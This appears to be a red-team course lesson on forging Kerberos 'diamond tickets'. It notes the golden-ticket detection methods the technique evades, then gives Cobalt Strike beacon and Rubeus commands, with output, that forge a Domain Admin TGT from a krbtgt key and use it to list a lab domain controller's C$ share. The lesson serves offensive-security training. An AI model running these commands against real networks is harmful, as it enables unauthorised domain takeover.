Like a golden ticket, a diamond ticket is a TGT which can be used to access any service as any user.  A golden ticket is forged completely offline, encrypted with the krbtgt hash of that domain, and then passed into a logon session for use.  Because domain controllers don't track TGTs it (or they) have legitimately issued, they will happily accept TGTs that are encrypted with its own krbtgt hash.

As previously mentioned, there are two common techniques to detect the use of golden tickets:

-   Look for TGS-REQs that have no corresponding AS-REQ.
-   Look for TGTs that have silly values, such as Mimikatz's default 10-year lifetime.

  

A diamond ticket is made by modifying the fields of a legitimate TGT that was issued by a DC.  This is achieved by requesting a TGT, decrypting it with the domain's krbtgt hash, modifying the desired fields of the ticket, then re-encrypting it.  This overcomes the two aforementioned shortcomings of a golden ticket because:

-   TGS-REQs will have a preceding AS-REQ.
-   The TGT was issued by a DC which means it will have all the correct details from the domain's Kerberos policy.  Even though these can be accurately forged in a golden ticket, it's more complex and open to mistakes.

  

First we prove we have no access to the DC as **bfarmer**.

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> ls \\dc-2\c$
[-] could not open \\dc-2\c$\*: 5
```

Diamond tickets can now be created with Rubeus.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1112 /groups:512 /krbkey:390b2f[...snip...]91a8aa /nowrap
```

Where:

-   `/tgtdeleg` uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
-   `/ticketuser` is the username of the principal to impersonate.
-   `/ticketuserid` is the domain RID of that principal.  This can be obtained using a command like `powershell Get-DomainUser -Identity nlamb -Properties objectsid`.
-   `/groups` are the desired group RIDs (512 being Domain Admins).
-   `/krbkey` is the krbtgt AES256 hash.

  

```
[*] Action: Diamond Ticket

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/dc-2.dev.cyberbotic.io'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: +mzV4aOvQx3/dpZGBaVEhccq1t+jhKi8oeCYXkjHXw4=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFgz [...snip...] MuSU8=

[*] Decrypting TGT
[*] Retreiving PAC
[*] Modifying PAC
[*] Signing PAC
[*] Encrypting Modified TGT

[*] base64(ticket.kirbi):

doIFYj [...snip...] MuSU8=
```

  

Rubeus `describe` will now show that this is a TGT for the target user.

```
C:\>C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=

[*] Action: Describe Ticket

  ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  nlamb
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  7/7/2022 8:41:46 AM
  EndTime                  :  7/7/2022 6:41:46 PM
  RenewTill                :  1/1/1970 12:00:00 AM
  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  jp4k3G5LvXpIl3cuAnTtgLuxOWkPJIUjOEZB5wrHdVw=
```

  

And we can leverage it to access a resource such as the domain controller.

```
beacon> make_token DEV\nlamb FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\nlamb.kirbi

beacon> ls \\dc-2\c$
[*] Listing: \\dc-2\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 11:11:35   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     01/20/2022 16:37:14   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     03/01/2022 16:34:27   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     03/25/2021 10:23:35   Shares
          dir     02/19/2021 11:49:20   System Volume Information
          dir     03/01/2022 10:51:31   Users
          dir     03/01/2022 13:14:40   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 704mb    fil     07/07/2022 08:25:04   pagefile.sys
```